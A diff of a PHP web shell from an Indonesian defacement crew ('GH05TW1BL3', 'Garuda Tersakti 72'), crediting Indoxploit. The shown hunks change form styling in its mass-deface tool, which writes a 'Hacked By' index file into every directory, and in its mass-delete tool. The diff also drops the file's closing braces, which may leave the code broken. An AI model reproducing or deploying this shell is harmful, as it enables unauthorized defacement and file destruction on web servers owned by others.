@@ -103,7 +103,6 @@ javascript:startTyping(text, 50, "textDestination");
 /**
 Special thx to Indoxploit,
 and my team garuda tersakti 72
-
 ---- ./GH05TW1BL3 ----
 **/
 if(isset($_GET['dir'])) {
@@ -178,18 +177,17 @@ elseif($_GET['go'] == 'mass'){
 	echo "<center>";
 	echo "<form method='post'>
 	<font style='text-decoration: underline;'>Tipe:</font><br>
-	<div style='background:transparent;border:1px solid aqua;padding:5px;width:440px;'/>
+	<div style='background:transparent;border:1px solid aqua;padding:5px;width:300px;'/>
 	<input type='radio' name='tipe' value='biasa' checked>Biasa<input type='radio' name='tipe' value='massal'>Massal</div><br>
 	<font style='text-decoration: underline;'>Dir:</font><br>
-	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
+	<input type='text' name='d_dir' value='$dir' style='width: 300px;' height='10'><br>
 	<font style='text-decoration: underline;'>Filename:</font><br>
-	<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
+	<input type='text' name='d_file' value='index.php' style='width: 300px;' height='10'><br>
 	<font style='text-decoration: underline;'>Index File:</font><br>
-	<textarea name='script' style='width: 450px; height: 200px;'>Hacked By ./GH05TW1BL3 | GARUDA TERSAKTI 72</textarea><br>
-	<input type='submit' name='start' value='Goo!' style='width: 450px;' class='btn btn-success btn-sm'>
+	<textarea name='script' style='width: 450px; height: 300px;'>Hacked By ./GH05TW1BL3 | GARUDA TERSAKTI 72</textarea><br>
+	<input type='submit' name='start' value='Goo!' style='width: 300px;' class='btn btn-success btn-sm'>
 	</form>";
 		echo"<u><a href='http://facebook.com/Tubagus19.id' target='_blank'>Say hello to me :)</a><u/></center>";
-
 	}
 }
 elseif($_GET['go'] == 'delet') {
@@ -230,13 +228,9 @@ elseif($_GET['go'] == 'delet') {
 	echo "<center>";
 	echo "<form method='post'>
 	<font style='text-decoration: underline;'>Dir:</font><br>
-	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
+	<input type='text' name='d_dir' value='$dir' style='width: 300px;' height='10'><br>
 	<font style='text-decoration: underline;'>Filename:</font><br>
-	<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
-	<input type='submit' name='start' value='Goo!' style='width: 450px;'>
+	<input type='text' name='d_file' value='index.php' style='width: 300px;' height='10'><br>
+	<input type='submit' name='start' value='Goo!' style='width: 300px;'>
 	</form>";
 		echo"<u><a href='https://api.whatsapp.com/send?phone=6285745620638&text=' target='_blank'>Say hello to me :)</a></u></center>";
-}
-}
-}
-?>
